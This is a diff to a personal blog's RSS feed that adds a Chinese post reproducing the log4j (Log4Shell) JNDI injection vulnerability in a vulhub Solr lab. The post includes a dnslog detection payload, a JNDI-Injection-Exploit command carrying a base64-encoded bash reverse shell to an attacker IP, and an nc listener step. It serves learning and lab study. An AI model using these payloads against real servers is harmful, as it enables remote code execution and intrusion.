@@ -5,8 +5,71 @@
         <link>http://example.com</link>
         <description>Personal Learning Blog</description>
         <language>zh-HK</language>
-        <pubDate>Wed, 02 Nov 2022 15:35:22 +0800</pubDate>
-        <lastBuildDate>Wed, 02 Nov 2022 15:35:22 +0800</lastBuildDate>
+        <pubDate>Mon, 07 Nov 2022 15:50:46 +0800</pubDate>
+        <lastBuildDate>Mon, 07 Nov 2022 15:50:46 +0800</lastBuildDate>
+        <item>
+            <guid isPermalink="true">http://example.com/2022/11/07/log4j%20%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/</guid>
+            <title>log4j漏洞复现</title>
+            <link>http://example.com/2022/11/07/log4j%20%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/</link>
+            <pubDate>Mon, 07 Nov 2022 15:50:46 +0800</pubDate>
+            <description><![CDATA[ &lt;h3 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言：&lt;/h3&gt;
+&lt;p&gt;JNDI (Java Naming and Directory Interface，JAVA 命名和目录接口），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。&lt;br /&gt;
+简单理解：有一个类似于字典的数据源，你可以通过 JNDI 接口，传一个 name 进去，就能获取到对象了&lt;br /&gt;
+不同的数据源肯定有不同的查找方式，使用 JNDI 也只是一个上层封装，在它下面也支持很多种具体的数据源。&lt;br /&gt;
+&lt;img data-src=&#34;https://img-blog.csdnimg.cn/7932bb1398374f7d8d3f232989b21874.jpeg#pic_center&#34; alt=&#34;LDAP&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;LDAP (轻量级目录访问协议)&lt;br /&gt;
+ 有一个类似于字典的数据源，你可以通过 LDAP 协议，传一个 name 进去，就能获取到数据。&lt;/p&gt;
+&lt;h3 id=&#34;原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原理&#34;&gt;#&lt;/a&gt; 原理：&lt;/h3&gt;
+&lt;p&gt;假如某一个 Java 程序中，将浏览器的类型记录到了日志中：&lt;br /&gt;
+String userAgent = request.getHeader(&amp;quot;User-Agent&amp;quot;);&lt;br /&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2xvZ2dlci5pbmZv&#34;&gt;logger.info&lt;/span&gt;(userAgent);&lt;br /&gt;
+ 这个 UA 头是外界输入的可被自定义的值，若其中是这样一串字符&lt;br /&gt;
+ ${jndi:ldap://127.0.0.1/exploit}&lt;br /&gt;
+ log4j 将会对这行要输出的字符串进行解析。&lt;br /&gt;
+首先，它发现了字符串中有 ${}，知道这个里面包裹的内容是要单独处理的。&lt;br /&gt;
+进一步解析，发现是 JNDI 扩展内容。&lt;br /&gt;
+再进一步，发现是 LDAP 协议，LDAP 服务器在 127.0.0.1，要查找的 key 是 exploit。&lt;br /&gt;
+最后，调用具体复制 LDAP 的模块去请求对应的数据。&lt;br /&gt;
+问题就出在这个请求数据可以请求 Java 对象，java 对象一般只存在于内存中，单页可以通过序列化的方式将其存储到文件中，或者通过网络传输。&lt;br /&gt;
+更危险的在于：JNDI 还支持一个叫命名引用 (Naming References) 的方式，可以通过远程下载一个 class 文件，然后下载后加载起来构建对象。&lt;br /&gt;
+&lt;mark&gt;核心问题：JNDI 可以远程下载 class 文件来构建对象！&lt;/mark&gt;&lt;br /&gt;
+如果远程下载的 url 指向的是一个恶意攻击的服务器，下载的 class 文件里面含有恶意代码，本地服务器就 G 了&lt;/p&gt;
+&lt;h3 id=&#34;漏洞复现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞复现&#34;&gt;#&lt;/a&gt; 漏洞复现：&lt;/h3&gt;
+&lt;p&gt;①kali docker 启动漏洞环境&lt;br /&gt;
+ cd /home/ayu/vulhub/log4j&lt;br /&gt;
+docker-compose up -d&lt;br /&gt;
+②访问 ip:8983web 界面（是个 apache solr 界面&lt;/p&gt;
+&lt;p&gt;③bp 抓取刷新界面数据包（需要放两个包，得到 accept 有 json 方法的包&lt;br /&gt;
+&lt;img data-src=&#34;https://img-blog.csdnimg.cn/13d01aaabe924609803818508686c1e3.png#pic_center&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;/solr/admin/cores?action=${jndi:ldap://${sys:java.version}.4zybrx.dnslog.cn}&lt;br /&gt;
+ 拼接路径访问 dnslog，状态码为 400 且 dnslog 有访问记录算存在漏洞&lt;br /&gt;
+&lt;img data-src=&#34;https://img-blog.csdnimg.cn/707d555834854b30bda686bad42a555c.png#pic_center&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;br /&gt;
+&lt;img data-src=&#34;https://img-blog.csdnimg.cn/fe801eb4379846cd9760709f68064321.png#pic_center&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;br /&gt;
+④进一步利用 log4j getshell&lt;br /&gt;
+JNDI 工具地址：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2Qtcm4vdnVsQm94L2Jsb2IvbWFpbi9KTkRJLUluamVjdGlvbi1FeHBsb2l0LTEuMC1TTkFQU0hPVC1hbGwuamFy&#34;&gt;https://github.com/d-rn/vulBox/blob/main/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar&lt;/span&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;下载工具：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;git clone &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2Qtcm4vdnVsQm94L2Jsb2IvbWFpbi9KTkRJLUluamVjdGlvbi1FeHBsb2l0LTEuMC1TTkFQU0hPVC1hbGwuamFy&#34;&gt;https://github.com/d-rn/vulBox/blob/main/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar&lt;/span&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &amp;quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTA0LzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}&amp;quot; -A &amp;quot;192.168.0.104&amp;quot;&lt;br /&gt;
+(base64 的内容为 bash -i&amp;gt;&amp;amp; /dev/tcp/ 要反弹的 ip / 端口号 0&amp;gt;&amp;amp;1，-A “工具所在的 ip”)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;工具运行生成如下界面，会有几个紫色字体 payload 生成，直接拼接到 /solr/admin/cores?action=${jndi:payload}&lt;br /&gt;
+&lt;img data-src=&#34;https://img-blog.csdnimg.cn/ee3b59fe874443a7ace554edffd95879.png#pic_center&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;br /&gt;
+ Windows10 开启 nc 监听&lt;br /&gt;
+&lt;img data-src=&#34;https://img-blog.csdnimg.cn/c13f4435024a4d4c9816b000a16c47cc.png#pic_center&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;br /&gt;
+若 一个 payload 没反弹成功就多试两个，成功了 nc 直接获得反弹 shell（且这个反弹 shell 不会乱码，试验过在 kali 端直接执行 bash 反弹过来的 shell 都会乱码，工具有点顶）&lt;br /&gt;
+&lt;img data-src=&#34;https://img-blog.csdnimg.cn/b3949e8b9bb24ec290a72d86409edbad.png#pic_center&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/a3527963b53b4faabb361ac6a59de50f.png#pic_center&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;感谢 h1dm 师傅的复现文章&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzU2NjA3NzY4L2FydGljbGUvZGV0YWlscy8xMjUxNTQ0MzY=&#34;&gt;https://blog.csdn.net/qq_56607768/article/details/125154436&lt;/span&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">http://example.com/2022/11/02/hello-world/</guid>
             <title>Hello World</title>
